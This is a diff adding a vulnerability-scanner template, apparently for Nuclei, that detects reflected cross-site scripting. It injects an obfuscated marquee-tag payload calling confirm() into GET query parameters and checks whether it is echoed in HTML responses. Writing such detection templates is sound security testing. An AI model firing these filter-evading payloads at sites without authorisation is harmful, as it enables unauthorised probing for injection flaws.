@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-marquee
+
+info:
+  name: Marquee Tag Reflection XSS Detection
+  author: netbaan
+  severity: low
+  description: |
+    This template detects reflection XSS vulnerabilities using a custom marquee payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Only run on GET requests
+
+    payloads:
+      reflection:
+        - "<marquee/onstart=c=String.fromCharCode;confirm(c(47)+c(88)+c(83)+c(83)+c(47))>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
